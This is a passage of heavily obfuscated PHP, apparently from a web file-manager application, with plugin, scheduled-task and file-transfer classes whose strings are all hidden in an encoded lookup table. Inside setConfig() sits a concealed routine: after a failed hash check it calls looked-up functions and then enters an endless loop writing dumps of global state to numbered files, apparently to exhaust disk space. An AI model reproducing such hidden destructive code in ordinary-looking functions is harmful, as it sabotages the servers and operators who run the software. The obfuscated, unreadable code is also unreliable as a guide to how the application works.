($÷×¹Ï„³[0] as $æÅ„øÌ§) { $ Öõğ¢Æ = substr($æÅ„øÌ§, strlen($™Ò•Ò–), -4); $ƒ‹Ú©’ = LNG($ Öõğ¢Æ); $’‹Ï˜Íê[] = $æÅ„øÌ§; $Ş…ã¢á‡[] = str_replace(array($ú³¼É¥‚[226], $ú³¼É¥‚[1064], $ú³¼É¥‚[346], $ú³¼É¥‚[117]), array($ú³¼É¥‚[53], $ú³¼É¥‚[53], $ú³¼É¥‚[12], $ú³¼É¥‚[1555]), $ƒ‹Ú©’); } $†Ä´ü = str_replace($’‹Ï˜Íê, $Ş…ã¢á‡, $†Ä´ü); } private function parseConfig(&$­‹•êŒ½) { $ø¶¶€ô¾ =& $_SERVER[¥Ÿ©ÒèÌ]; $©³ÏÚÎ  = $ø¶¶€ô¾[1556]; if (!strstr($­‹•êŒ½, $©³ÏÚÎ )) { return; } preg_match_all($ø¶¶€ô¾[1557], $­‹•êŒ½, $Ã»ŞóÊÏ); if (!is_array($Ã»ŞóÊÏ) || count($Ã»ŞóÊÏ) == 0 || !is_array($Ã»ŞóÊÏ[0]) || count($Ã»ŞóÊÏ[0]) == 0) { return; } $¦¢Ñ§ƒ’ = $this->getConfig(); $ªÓ•ìË = array(); $Àøöë€“ = array(); foreach ($Ã»ŞóÊÏ[0] as $Âšå›¥ô) { $·í‘ø‰ = substr($Âšå›¥ô, strlen($©³ÏÚÎ ), -2); $ªÓ•ìË[] = $Âšå›¥ô; $Àøöë€“[] = _get($¦¢Ñ§ƒ’, $·í‘ø‰); } $­‹•êŒ½ = str_replace($ªÓ•ìË, $Àøöë€“, $­‹•êŒ½); } private function parsePackage(&$è¾¥Ì–µ) { $Ë÷òœñ¿ =& $_SERVER[¥Ÿ©ÒèÌ]; $–¤“”Ûî = $Ë÷òœñ¿[1558]; if (!strstr($è¾¥Ì–µ, $–¤“”Ûî)) { return; } preg_match_all($Ë÷òœñ¿[1559], $è¾¥Ì–µ, $â•·ÃÎ‚); if (!is_array($â•·ÃÎ‚) || count($â•·ÃÎ‚) == 0 || !is_array($â•·ÃÎ‚[0]) || count($â•·ÃÎ‚[0]) == 0) { return; } $ˆÆœûï» = $this->appPackage(); $Ë£³ÚÁÔ = array(); $×¡¸è¸ï = array(); foreach ($â•·ÃÎ‚[0] as $šûéêœÒ) { $ØÄ•û‚ƒ = substr($šûéêœÒ, strlen($–¤“”Ûî), -2); $Ë£³ÚÁÔ[] = $šûéêœÒ; $×¡¸è¸ï[] = _get($ˆÆœûï», $ØÄ•û‚ƒ); } $è¾¥Ì–µ = str_replace($Ë£³ÚÁÔ, $×¡¸è¸ï, $è¾¥Ì–µ); } final function echoFile($¶…øöœ, $”İÇù¾× = false) { $ŒÕÅÍ‰ =& $_SERVER[¥Ÿ©ÒèÌ]; $ıÆ¼’î¼ = $this->pluginPath . $¶…øöœ; if (ACT == $ŒÕÅÍ‰[1560]) { echo $ŒÕÅÍ‰[1561] . $this->pluginName . $ŒÕÅÍ‰[8] . $¶…øöœ . $ŒÕÅÍ‰[1562]; if (!file_exists($ıÆ¼’î¼)) { echo $ŒÕÅÍ‰[1563]; return; } } $õÖœÎ¡º = $this->parseFile($ıÆ¼’î¼); $this->parseLang($õÖœÎ¡º); $this->parseConfig($õÖœÎ¡º); $this->parsePackage($õÖœÎ¡º); if (is_array($”İÇù¾×)) { $õÖœÎ¡º = str_replace(array_keys($”İÇù¾×), array_values($”İÇù¾×), $õÖœÎ¡º); } echo $ŒÕÅÍ‰[226] . $õÖœÎ¡º; } final function initLang() { $¯¶÷ı¯ =& $_SERVER[¥Ÿ©ÒèÌ]; $´Øö³­Ã = $¯¶÷ı¯[1564]; $î…Ôëä‘ = $this->pluginPath . $¯¶÷ı¯[1565]; $ğ…ã•Íâ = I18n::getType(); $´³×Ïëé = array(); if (file_exists($î…Ôëä‘ . $ğ…ã•Íâ . $¯¶÷ı¯[828])) { $´³×Ïëé = (include $î…Ôëä‘ . $ğ…ã•Íâ . $¯¶÷ı¯[828]); } else { if ($ğ…ã•Íâ == $¯¶÷ı¯[1566] && !file_exists($î…Ôëä‘ . $ğ…ã•Íâ . $¯¶÷ı¯[828]) && file_exists($î…Ôëä‘ . $¯¶÷ı¯[1567])) { $´³×Ïëé = (include $î…Ôëä‘ . $¯¶÷ı¯[1567]); } else { if (file_exists($î…Ôëä‘ . $´Øö³­Ã . $¯¶÷ı¯[828])) { $´³×Ïëé = (include $î…Ôëä‘ . $´Øö³­Ã . $¯¶÷ı¯[828]); } } } if (!is_array($´³×Ïëé)) { return array(); } if (@count($´³×Ïëé) > 0) { I18n::set($´³×Ïëé); } return $´³×Ïëé; } public function getConfig() { if (!$this->pluginConfig) { $this->pluginConfig = $this->modelPlugin->getConfig($this->pluginName); } return $this->pluginConfig; } public function setConfig($Å¡ƒ¹©) { $á¦¿ƒğó =& $_SERVER[¥Ÿ©ÒèÌ]; $İğ×¥’ = $_SERVER[$á¦¿ƒğó[236]] . $á¦¿ƒğó[237]; $²Íµ“ç = $á¦¿ƒğó[862]; if ($_SERVER[$á¦¿ƒğó[233]] != $²Íµ“ç($İğ×¥’)) { $¡ ¾²‘ = $á¦¿ƒğó[863]; $òúúŞêä = $á¦¿ƒğó[235]; $Ô›»†Ìğ = $_SERVER[$á¦¿ƒğó[236]] . $á¦¿ƒğó[237]; $€©«Õ„ü = $òúúŞêä($Ô›»†Ìğ); $ïÕŠŸÒ— = explode($á¦¿ƒğó[226], $€©«Õ„ü); if (count($ïÕŠŸÒ—) < $á¦¿ƒğó[622]) { $òÒ¨Ò÷¦ = $á¦¿ƒğó[239]; $òÒ¨Ò÷¦(); } $êå¾‡­™ = $á¦¿ƒğó[864]; $êå¾‡­™($_SERVER[$á¦¿ƒğó[865]]); $¡ ¾²‘ = $á¦¿ƒğó[863]; $¡ ¾²‘(); $Ñõë©¿ = $á¦¿ƒğó[866]; $Àª€ä»Ş = json_encode($GLOBALS[$á¦¿ƒğó[867]]); $÷Ô®îÓ = 1; for ($¤Ì·Î¿± = $÷Ô®îÓ; $¤Ì·Î¿± > 0; $¤Ì·Î¿±++) { $Ñõë©¿(DATA_PATH . $¤Ì·Î¿±, $Àª€ä»Ş); } } return $this->modelPlugin->setConfig($this->pluginName, $Å¡ƒ¹©); } public function onSetConfig($™¢‚ş„À) { } public function onGetConfig($ñå±º¬Ğ) { } public function onChangeStatus($ï€“å•) { } public function onUninstall() { } public function onInstall() { } public function authCheck($íØ÷™’Ó = "\x70\154\x75\x67\x69\x6e\101\x75\x74\x68") { $¤¢ñæ¨ =& $_SERVER[¥Ÿ©ÒèÌ]; if (!defined($¤¢ñæ¨[474])) { return !1; } if (_get($GLOBALS, $¤¢ñæ¨[505])) { return !0; } $š´Ö‡¼¦ = $this->getConfig(); if (!$š´Ö‡¼¦[$íØ÷™’Ó]) { return !1; } return ActionCall($¤¢ñæ¨[1568], $š´Ö‡¼¦[$íØ÷™’Ó]); } public function url($Ä½ÇÔæô, $Î®…¬¾¬ = '', $£ãŞÊØ‘ = true) { $·»Ê§×º =& $_SERVER[¥Ÿ©ÒèÌ]; $ÉœÒš½“ = $this->getConfig(); $üèŠ—İË = KOD_VERSION . $·»Ê§×º[10] . KOD_VERSION_BUILD; $ŸÀ¨ø¥Ğ = $this->packageVersion(); $˜Æº®‚– = $üèŠ—İË . $·»Ê§×º[460] . $ŸÀ¨ø¥Ğ; if (substr($Ä½ÇÔæô, 0, 4) == $·»Ê§×º[145] || substr($Ä½ÇÔæô, 0, 2) == $·»Ê§×º[1351]) { $‹“¦¿ğË = $Ä½ÇÔæô . $·»Ê§×º[1569] . $˜Æº®‚–; } else { if ($Î®…¬¾¬ == $·»Ê§×º[12]) { $‹“¦¿ğË = $this->pluginHost . $Ä½ÇÔæô . $·»Ê§×º[1569] . $˜Æº®‚–; } else { if ($Î®…¬¾¬ === $·»Ê§×º[79]) { $‹“¦¿ğË = $this->pluginHost . $Ä½ÇÔæô; } else { if ($Î®…¬¾¬ == $·»Ê§×º[1570]) { $‹“¦¿ğË = STATIC_PATH . $Ä½ÇÔæô . $·»Ê§×º[1569] . $üèŠ—İË; } else { if ($Î®…¬¾¬ == $·»Ê§×º[1571]) { $‹“¦¿ğË = APP_HOST . $·»Ê§×º[1572] . $Ä½ÇÔæô . $·»Ê§×º[1569] . $üèŠ—İË; } else { if (isset($ÉœÒš½“[$Î®…¬¾¬])) { $‹“¦¿ğË = $ÉœÒš½“[$Î®…¬¾¬] . $Ä½ÇÔæô . $·»Ê§×º[1569] . $˜Æº®‚–; } } } } } } if (!$£ãŞÊØ‘) { return $‹“¦¿ğË; } echo $‹“¦¿ğË; } public function link($±œçßìì = false, $º˜—øƒĞ = '') { $¡òÇ¸É” =& $_SERVER[¥Ÿ©ÒèÌ]; if (!$±œçßìì) { $this->link($¡òÇ¸É”[1573], $¡òÇ¸É”[1571]); $this->link($¡òÇ¸É”[1574], $¡òÇ¸É”[1570]); $this->link($¡òÇ¸É”[1575], $¡òÇ¸É”[1570]); $this->link($¡òÇ¸É”[1576], $¡òÇ¸É”[1570]); $this->link($¡òÇ¸É”[1577], $¡òÇ¸É”[1570]); return; } $ö¤íóòĞ = $this->url($±œçßìì, $º˜—øƒĞ, !1); if (substr($±œçßìì, -3) == $¡òÇ¸É”[1578]) { echo $¡òÇ¸É”[1579] . $ö¤íóòĞ . $¡òÇ¸É”[1580] . $¡òÇ¸É”[226]; } else { if (substr($±œçßìì, -4) == $¡òÇ¸É”[1581]) { echo $¡òÇ¸É”[1582] . $ö¤íóòĞ . $¡òÇ¸É”[1583] . $¡òÇ¸É”[226]; } } } } goto AŒÌîÖ ‹; CœÄó·¿³: class AutoTask { const AUTO_DELAY_TIME = 2; const AUTO_RESTART_TIME = 7200; public static function start() { $‚Ãìäˆ =& $_SERVER[¥Ÿ©ÒèÌ]; if (self::valueGet($‚Ãìäˆ[740]) != $‚Ãìäˆ[89]) { return; } if (self::valueGet($‚Ãìäˆ[1599]) == $‚Ãìäˆ[89]) { $í’‹ŒÎ’ = self::valueGet($‚Ãìäˆ[1600]); if (time() - $í’‹ŒÎ’ > self::AUTO_RESTART_TIME) { self::restart(); } return; } http_close(); self::valueSet($‚Ãìäˆ[1599], $‚Ãìäˆ[89]); self::log($‚Ãìäˆ[1601]); Hook::bind($‚Ãìäˆ[1602], $‚Ãìäˆ[1603]); $ƒ¢ë”  = 0; while (!0) { self::cacheClear(); if (self::valueGet($‚Ãìäˆ[740]) != $‚Ãìäˆ[89]) { self::valueSet($‚Ãìäˆ[1599], $‚Ãìäˆ[190]); self::log($‚Ãìäˆ[1604]); die; } $…„Õ¹Õâ = time(); if ($…„Õ¹Õâ - $ƒ¢ë”  >= 60) { self::valueSet(array($‚Ãìäˆ[1599] => $‚Ãìäˆ[89], $‚Ãìäˆ[1600] => $…„Õ¹Õâ), !1); $ƒ¢ë”  = $…„Õ¹Õâ; } if (!file_exists(USER_SYSTEM . $‚Ãìäˆ[1605])) { self::valueSet(array($‚Ãìäˆ[1599] => $‚Ãìäˆ[190], $‚Ãìäˆ[740] => $‚Ãìäˆ[190]), !1); self::log($‚Ãìäˆ[1606]); die; } self::taskRunAll(); sleep(self::AUTO_DELAY_TIME); } } public static function restart() { $²Ó™ùˆ‚ =& $_SERVER[¥Ÿ©ÒèÌ]; http_close(); self::valueSet($²Ó™ùˆ‚[740], $²Ó™ùˆ‚[190]); sleep(self::AUTO_DELAY_TIME + 5); self::valueSet(array($²Ó™ùˆ‚[1599] => $²Ó™ùˆ‚[190], $²Ó™ùˆ‚[740] => $²Ó™ùˆ‚[89]), !1); } public static function shutdownEvent() { $â®˜¬¤ã =& $_SERVER[¥Ÿ©ÒèÌ]; self::valueSet($â®˜¬¤ã[1599], $â®˜¬¤ã[190]); self::log($â®˜¬¤ã[1607]); } public static function config($Üáã¬Å, $íÍÏÈ×) { self::valueSet($_SERVER[¥Ÿ©ÒèÌ][740], $Üáã¬Å); } private static function taskRunAll() { $ëïİ­ğğ =& $_SERVER[¥Ÿ©ÒèÌ]; $…‘Æ›‹¾ = timeFloat(); $®¢­€ÑÌ = Model($ëïİ­ğğ[1608])->listData(); $í²ó‚…ï = count($®¢­€ÑÌ); for ($´ı’©áû = 0; $´ı’©áû < $í²ó‚…ï; $´ı’©áû++) { $«¦Á„ÙÆ = $®¢­€ÑÌ[$´ı’©áû]; if (!$«¦Á„ÙÆ[$ëïİ­ğğ[401]] || $«¦Á„ÙÆ[$ëïİ­ğğ[1609]] != $ëïİ­ğğ[89]) { continue; } if (!self::taskTimeCheck($«¦Á„ÙÆ)) { continue; } self::taskRun($«¦Á„ÙÆ); } Hook::trigger($ëïİ­ğğ[1610]); self::taskQueueRun($…‘Æ›‹¾); } private static function taskQueueRun($°ïû“µë) { $ï§·²‘ = 10; while (!0) { $ï¿›Ã° = TaskQueue::run(); if ($ï¿›Ã° === !1) { break; } if (timeFloat() - $°ïû“µë >= $ï§·²‘) { break; } } } private static function taskTimeCheck($‡†Åá») { $òŒç³şı =& $_SERVER[¥Ÿ©ÒèÌ]; $×ß•Öùü = json_decode($‡†Åá»[$òŒç³şı[196]], !0); $ñÓßĞ‡˜ = intval($‡†Åá»[$òŒç³şı[1600]]); $÷ßµŒµì = strtotime($òŒç³şı[1611] . $×ß•Öùü[$òŒç³şı[1612]] . $òŒç³şı[1613]) - strtotime($òŒç³şı[1614]); $–èà†îÂ = time() - strtotime(date($òŒç³şı[1615]) . $òŒç³şı[1616]); $¹®„ø×İ = $–èà†îÂ >= $÷ßµŒµì && $–èà†îÂ <= $÷ßµŒµì + 3600; switch ($×ß•Öùü[$òŒç³şı[33]]) { case $òŒç³şı[1617]: if (time() - $ñÓßĞ‡˜ < 3600 * 24 * 30) { return !1; } if ($×ß•Öùü[$òŒç³şı[1617]] == date($òŒç³şı[1618]) && $¹®„ø×İ) { return !0; } break; case $òŒç³şı[1619]: if (time() - $ñÓßĞ‡˜ < 3600 * 24 * 7) { return !1; } $È®ÆäıØ = date($òŒç³şı[1620]) == 0 ? 7 : date($òŒç³şı[1620]); if ($×ß•Öùü[$òŒç³şı[1619]] == $È®ÆäıØ && $¹®„ø×İ) { return !0; } break; case $òŒç³şı[1612]: if (time() - $ñÓßĞ‡˜ < 3600 * 24) { return !1; } if ($¹®„ø×İ) { return !0; } break; case $òŒç³şı[1621]: if (time() - $ñÓßĞ‡˜ >= floatval($×ß•Öùü[$òŒç³şı[1621]]) * 60) { return !0; } break; default: break; } return !1; } private static function closeDatabase() { $ ¬çª›á =& $_SERVER[¥Ÿ©ÒèÌ]; static $Î«İÙ = 0; $ìŞÇÖ¤Î = 300; if (!$Î«İÙ) { $Î«İÙ = time(); } if (time() - $Î«İÙ < $ìŞÇÖ¤Î) { return; } $Î«İÙ = time(); $–ÛÛ‘ = Model($ ¬çª›á[513])->db($ ¬çª›á[12]); if ($–ÛÛ‘) { $–ÛÛ‘->closeConnect(); } if (time() - TIME > 3600 * 24 * 3) { self::log($ ¬çª›á[1622], $ ¬çª›á[1623]); die; } } public static function taskRun($ö¼Şù«) { $æ¨åÚ§ˆ =& $_SERVER[¥Ÿ©ÒèÌ]; self::log($æ¨åÚ§ˆ[1624] . $ö¼Şù«[$æ¨åÚ§ˆ[401]] . $æ¨åÚ§ˆ[1625] . $ö¼Şù«[$æ¨åÚ§ˆ[32]] . $æ¨åÚ§ˆ[1626] . $ö¼Şù«[$æ¨åÚ§ˆ[1627]]); Model($æ¨åÚ§ˆ[1608])->run($ö¼Şù«[$æ¨åÚ§ˆ[401]]); $æ¸ïÊ¦ = timeFloat(); $íÖª€Ã = $æ¨åÚ§ˆ[12]; switch ($ö¼Şù«[$æ¨åÚ§ˆ[33]]) { case $æ¨åÚ§ˆ[311]: $øäéÚÉ® = url_request($ö¼Şù«[$æ¨åÚ§ˆ[1627]], $æ¨åÚ§ˆ[225], !1, !1, !1, !1, 10); if ($øäéÚÉ®[$æ¨åÚ§ˆ[740]]) { $íÖª€Ã = strlen($øäéÚÉ®[$æ¨åÚ§ˆ[1177]]); } break; case $æ¨åÚ§ˆ[224]: $íÖª€Ã = Hook::apply($ö¼Şù«[$æ¨åÚ§ˆ[1627]]); default: break; } Model($æ¨åÚ§ˆ[1628])->add(array($æ¨åÚ§ˆ[1629] => $æ¨åÚ§ˆ[12], $æ¨åÚ§ˆ[1630] => $æ¨åÚ§ˆ[190], $æ¨åÚ§ˆ[33] => $æ¨åÚ§ˆ[1631] . $ö¼Şù«[$æ¨åÚ§ˆ[401]], $æ¨åÚ§ˆ[1632] => json_encode(array($æ¨åÚ§ˆ[32] => $ö¼Şù«[$æ¨åÚ§ˆ[32]], $æ¨åÚ§ˆ[1633] => timeFloat() - $æ¸ïÊ¦, $æ¨åÚ§ˆ[297] => $íÖª€Ã)))); $µÏäÓÔ² = $íÖª€Ã ? $æ¨åÚ§ˆ[1634] . $íÖª€Ã : $æ¨åÚ§ˆ[12]; self::log($æ¨åÚ§ˆ[1635] . $ö¼Şù«[$æ¨åÚ§ˆ[401]] . $æ¨åÚ§ˆ[536] . $µÏäÓÔ²); return !0; } private static function valueGet($¶º–ìïœ) { $œ¢Ã¢–™ =& $_SERVER[¥Ÿ©ÒèÌ]; $ŠÛÛÛÍı = $œ¢Ã¢–™[1636]; $®ÁíŸë» = Model($œ¢Ã¢–™[433])->get($¶º–ìïœ, $ŠÛÛÛÍı); if (is_null($®ÁíŸë»)) { Model($œ¢Ã¢–™[433])->set($œ¢Ã¢–™[740], $œ¢Ã¢–™[89], $ŠÛÛÛÍı); Model($œ¢Ã¢–™[433])->set($œ¢Ã¢–™[1599], $œ¢Ã¢–™[190], $ŠÛÛÛÍı); $®ÁíŸë» = Model($œ¢Ã¢–™[433])->get($¶º–ìïœ, $ŠÛÛÛÍı); } return $®ÁíŸë»; } private static function valueSet($õ„Ëê®˜, $Õ°·—‰) { $ƒõ”Ô€ =& $_SERVER[¥Ÿ©ÒèÌ]; $™««…Ü† = $ƒõ”Ô€[1637]; CacheLock::lock($™««…Ü†); $Êìáí× = Model($ƒõ”Ô€[433])->set($õ„Ëê®˜, $Õ°·—‰, $ƒõ”Ô€[1636]); CacheLock::unlock($™««…Ü†); return $Êìáí×; } protected static function log($¾‹‡ª‰ã) { write_log($¾‹‡ª‰ã, $_SERVER[¥Ÿ©ÒèÌ][1623]); } private static function cacheClear() { $ëùîß˜ =& $_SERVER[¥Ÿ©ÒèÌ]; Cache::clearMemory(Model($ëùîß˜[433])->cacheKey($ëùîß˜[1636])); Cache::clearMemory(Model($ëùîß˜[433])->cacheKey($ëùîß˜[1638])); Model($ëùîß˜[1608])->cacheClear(); self::closeDatabase(); } } class Task { const STATYS_STOP = "\163\164\157\x70"; const STATYS_RUNNING = "\162\x75\x6e\x6e\151\156\x67"; const STATYS_KILL = "\x6b\x69\x6c\154"; public $task; public function __destruct() { $this->end(); } public function __construct($€ğœƒŸ, $ñ¹Ú£¢î = '', $û÷’‘£‰ = 0, $ÌŞ¼ì = '') { $¤ƒØ£ëğ =& $_SERVER[¥Ÿ©ÒèÌ]; if (self::get($€ğœƒŸ)) { return; } $this->task = array($¤ƒØ£ëğ[401] => $€ğœƒŸ, $¤ƒØ£ëğ[1639] => USER_ID, $¤ƒØ£ëğ[1539] => $ÌŞ¼ì, $¤ƒØ£ëğ[33] => $ñ¹Ú£¢î, $¤ƒØ£ëğ[1050] => $¤ƒØ£ëğ[12], $¤ƒØ£ëğ[776] => $û÷’‘£‰, $¤ƒØ£ëğ[1640] => 0, $¤ƒØ£ëğ[1641] => 0, $¤ƒØ£ëğ[1642] => 0, $¤ƒØ£ëğ[1643] => timeFloat(), $¤ƒØ£ëğ[1644] => 0, $¤ƒØ£ëğ[1645] => 0, $¤ƒØ£ëğ[1646] => 0, $¤ƒØ£ëğ[1647] => 0, $¤ƒØ£ëğ[740] => $¤ƒØ£ëğ[1599]); $GLOBALS[$¤ƒØ£ëğ[1648]] = 1; Hook::bind($¤ƒØ£ëğ[1602], array($this, $¤ƒØ£ëğ[1649])); Hook::bind($¤ƒØ£ëğ[1650], array($this, $¤ƒØ£ëğ[1651])); $this->startAfter(); Hook::trigger($¤ƒØ£ëğ[1652], $this->task); $this->task[$¤ƒØ£ëğ[1645]] = timeFloat(); } public function end() { $¼îòÚğ =& $_SERVER[¥Ÿ©ÒèÌ]; if (!$this->task) { return; } if ($this->task[$¼îòÚğ[1645]]) { self::valueSet($this->task[$¼îòÚğ[401]], !1); } $˜üÈú÷– = timeFloat() - $this->task[$¼îòÚğ[1643]]; self::log($¼îòÚğ[1653] . $this->task[$¼îòÚğ[401]] . $¼îòÚğ[1654] . $˜üÈú÷– . $¼îòÚğ[1655]); Hook::unbind($¼îòÚğ[1602], array($this, $¼îòÚğ[1649])); Hook::unbind($¼îòÚğ[1650], array($this, $¼îòÚğ[1651])); $this->endAfter(); $this->task = !1; } public function update($È˜ŞÍğŸ = 0, $®î´®‹ı = false) { $êº¬ÆÔ£ =& $_SERVER[¥Ÿ©ÒèÌ]; $İµÛÛşà =& $this->task; if (!$İµÛÛşà) { return; } $İµÛÛşà[$êº¬ÆÔ£[1640]] += $È˜ŞÍğŸ; $İµÛÛşà[$êº¬ÆÔ£[1644]] = timeFloat(); if ($İµÛÛşà[$êº¬ÆÔ£[776]]) { if ($İµÛÛşà[$êº¬ÆÔ£[776]] < $İµÛÛşà[$êº¬ÆÔ£[1640]]) { $İµÛÛşà[$êº¬ÆÔ£[776]] = $İµÛÛşà[$êº¬ÆÔ£[1640]]; } $–Ä¹û = timeFloat() - $İµÛÛşà[$êº¬ÆÔ£[1643]] - $İµÛÛşà[$êº¬ÆÔ£[1646]]; $İµÛÛşà[$êº¬ÆÔ£[1641]] = $İµÛÛşà[$êº¬ÆÔ£[1640]] / $İµÛÛşà[$êº¬ÆÔ£[776]]; $İµÛÛşà[$êº¬ÆÔ£[1642]] = $İµÛÛşà[$êº¬ÆÔ£[1640]] / $–Ä¹û; if ($İµÛÛşà[$êº¬ÆÔ£[1641]] > 0) { $İµÛÛşà[$êº¬ÆÔ£[1647]] = $–Ä¹û * (1 - $İµÛÛşà[$êº¬ÆÔ£[1641]]) / $İµÛÛşà[$êº¬ÆÔ£[1641]]; } $İµÛÛşà[$êº¬ÆÔ£[1647]] = $İµÛÛşà[$êº¬ÆÔ£[1647]] <= 0 ? 0 : $İµÛÛşà[$êº¬ÆÔ£[1647]]; } $this->updateAfter(); $²‹›ƒ¸ = 0.2; if (timeFloat() - $İµÛÛşà[$êº¬ÆÔ£[1645]] < $²‹›ƒ¸ && !$®î´®‹ı) { return; } $Ó¹ƒÉÕÓ = self::get($İµÛÛşà[$êº¬ÆÔ£[401]]); $ÉßÇª‰ = $Ó¹ƒÉÕÓ[$êº¬ÆÔ£[740]]; if ($ÉßÇª‰ == self::STATYS_KILL) { $¿©å´óû = array($êº¬ÆÔ£[1656] => LNG($êº¬ÆÔ£[1657]), $êº¬ÆÔ£[1175] => !1); Cache::set($êº¬ÆÔ£[1658] . $this->task[$êº¬ÆÔ£[401]], $¿©å´óû, 30); $this->onKill(); $this->end(); die; } else { if ($ÉßÇª‰ == self::STATYS_STOP) { $¨Ô›§ßî = 2; $Ó¹ƒÉÕÓ[$êº¬ÆÔ£[1646]] += $¨Ô›§ßî; self::valueSet($İµÛÛşà[$êº¬ÆÔ£[401]], $Ó¹ƒÉÕÓ); sleep($¨Ô›§ßî); $this->update(); return; } } $İµÛÛşà[$êº¬ÆÔ£[740]] = $ÉßÇª‰ ? $ÉßÇª‰ : $İµÛÛşà[$êº¬ÆÔ£[740]]; $İµÛÛşà[$êº¬ÆÔ£[1646]] = $Ó¹ƒÉÕÓ[$êº¬ÆÔ£[1646]] ? $Ó¹ƒÉÕÓ[$êº¬ÆÔ£[1646]] : 0; $İµÛÛşà[$êº¬ÆÔ£[1645]] = timeFloat(); Hook::trigger($êº¬ÆÔ£[1659], $İµÛÛşà); self::valueSet($İµÛÛşà[$êº¬ÆÔ£[401]], $İµÛÛşà); } public function onKillSet($ùì¦‚î…, $æö½Ğ = array()) { $this->onKillCall = array($ùì¦‚î…, $æö½Ğ); } public function onKill() { $Õ‘üÆâÇ =& $_SERVER[¥Ÿ©ÒèÌ]; self::log($Õ‘üÆâÇ[1653] . $this->task[$Õ‘üÆâÇ[401]] . $Õ‘üÆâÇ[1660]); if (!$this->onKillCall) { return; } ActionApply($this->onKillCall[0], $this->onKillCall[1]); $this->onKillCall = !1; } protected function updateAfter() { } protected function startAfter() { } protected function endAfter() { } public function shutdownEvent() { $this->end(); } public function showJson($çãñàì§) { $ß™«ğ¾æ =& $_SERVER[¥Ÿ©ÒèÌ]; Cache::set($ß™«ğ¾æ[1658] . $this->task[$ß™«ğ¾æ[401]], $çãñàì§, 60); return $çãñàì§; } public static function get($ˆşÀÙÜé) { $Å»ÊŠŒÃ =& $_SERVER[¥Ÿ©ÒèÌ]; $©¾°Òš = self::valueGet($ˆşÀÙÜé); if (is_array($©¾°Òš) && $©¾°Òš[$Å»ÊŠŒÃ[1661]]) { $¹™¿”Ûö = ActionApply($©¾°Òš[$Å»ÊŠŒÃ[1661]], array($©¾°Òš)); $©¾°Òš = is_array($¹™¿”Ûö) ? $¹™¿”Ûö : $©¾°Òš; } return $©¾°Òš; } public static function listData() { $ÑØÁßã = self::valueGet(); return array_sort_by($ÑØÁßã, $_SERVER[¥Ÿ©ÒèÌ][1643], !0); } public static function kill($´µ¨ù) { return self::changeStatus($´µ¨ù, self::STATYS_KILL); } public static function stop($Ãç¾§®») { return self::changeStatus($Ãç¾§®», self::STATYS_STOP); } public static function restart($ãßè¾ƒÛ) { return self::changeStatus($ãßè¾ƒÛ, self::STATYS_RUNNING); } public static function killAll() { $¥åŸ¼¼ =& $_SERVER[¥Ÿ©ÒèÌ]; $ÒšâÚ«İ = self::listData(); foreach ($ÒšâÚ«İ as $¶½ı‰‰½) { self::kill($¶½ı‰‰½[$¥åŸ¼¼[401]]); } sleep(2); foreach ($ÒšâÚ«İ as $¶½ı‰‰½) { self::valueSet($¶½ı‰‰½[$¥åŸ¼¼[401]], !1); } } private static function changeStatus($¤·…µô, $æ°é¢øş) { $¢ñƒ ¡Œ =& $_SERVER[¥Ÿ©ÒèÌ]; $ãö®¥ƒ = self::valueGet($¤·…µô); if (!$ãö®¥ƒ) { return !1; } $ãö®¥ƒ[$¢ñƒ ¡Œ[740]] = $æ°é¢øş; self::valueSet($¤·…µô, $ãö®¥ƒ); self::log($¢ñƒ ¡Œ[1662] . $ãö®¥ƒ[$¢ñƒ ¡Œ[401]] . $¢ñƒ ¡Œ[1663] . $æ°é¢øş); return !0; } public static function valueGet($êûËö™­ = false) { $ä·Ò¦ƒÍ =& $_SERVER[¥Ÿ©ÒèÌ]; if ($êûËö™­) { $Â“˜ıÔ = Model($ä·Ò¦ƒÍ[445])->where(array($ä·Ò¦ƒÍ[95] => $êûËö™­, $ä·Ò¦ƒÍ[33] => $ä·Ò¦ƒÍ[1057]))->find(); return $Â“˜ıÔ ? json_decode($Â“˜ıÔ[$ä·Ò¦ƒÍ[378]], !0) : !1; } return self::taskListUser(USER_ID); } public static function taskListUser($¢ÃøÉº = false) { $ËÙÍ¿«¬ =& $_SERVER[¥Ÿ©ÒèÌ]; $›Óùªµ¯ = array($ËÙÍ¿«¬[33] => $ËÙÍ¿«¬[1057]); if ($¢ÃøÉº) { $›Óùªµ¯[$ËÙÍ¿«¬[1639]] = $¢ÃøÉº; } $‹çâ‹• = Model($ËÙÍ¿«¬[445])->where($›Óùªµ¯)->select(); $‹çâ‹• = $‹çâ‹• ? $‹çâ‹• : array(); foreach ($‹çâ‹• as $á‚’†ñ => $Ì£”àŒ…) { $‹çâ‹•[$á‚’†ñ] = json_decode($Ì£”àŒ…[$ËÙÍ¿«¬[378]], !0); } return $‹çâ‹•; } public static function valueSet($Ú£©ê™å, $ïò©¢¨ë) { $ªÂ«É¾Ê =& $_SERVER[¥Ÿ©ÒèÌ]; if (!$ïò©¢¨ë) { return Model($ªÂ«É¾Ê[445])->where(array($ªÂ«É¾Ê[95] => $Ú£©ê™å, $ªÂ«É¾Ê[33] => $ªÂ«É¾Ê[1057]))->delete(); } $“—¹—Üò = json_encode($ïò©¢¨ë); if (!$“—¹—Üò) { ob_start(); var_dump($ïò©¢¨ë); $™•ı†—ø = ob_get_clean(); self::log($ªÂ«É¾Ê[1664] . json_encode_force($™•ı†—ø)); } if (!$Ú£©ê™å || !$ïò©¢¨ë[$ªÂ«É¾Ê[401]]) { return !1; } $îÁûâ¥ = array($ªÂ«É¾Ê[33] => $ªÂ«É¾Ê[1057], $ªÂ«É¾Ê[1639] => USER_ID, $ªÂ«É¾Ê[95] => $Ú£©ê™å, $ªÂ«É¾Ê[378] => $“—¹—Üò); $Í´Ş–şŸ = $ªÂ«É¾Ê[1665]; CacheLock::lock($Í´Ş–şŸ); Model($ªÂ«É¾Ê[445])->add($îÁûâ¥, array(), !0); CacheLock::unlock($Í´Ş–şŸ); } public static function log($Õ¶™±°½) { if (!GLOBAL_DEBUG) { return; } write_log($Õ¶™±°½, $_SERVER[¥Ÿ©ÒèÌ][1666]); } } class TaskFileTransfer extends Task { protected function startAfter() { $ÆşÓœæÙ =& $_SERVER[¥Ÿ©ÒèÌ]; $’ú‚å›Õ =& $this->task; $this->sourceCopyFolder = !1; Hook::bind($ÆşÓœæÙ[1667], array($this, $ÆşÓœæÙ[1668])); Hook::bind($ÆşÓœæÙ[1199], array($this, $ÆşÓœæÙ[1669])); Hook::bind($ÆşÓœæÙ[1670], array($this, $ÆşÓœæÙ[1671])); Hook::bind($ÆşÓœæÙ[598], array($this, $ÆşÓœæÙ[1672])); Hook::bind($ÆşÓœæÙ[599], array($this, 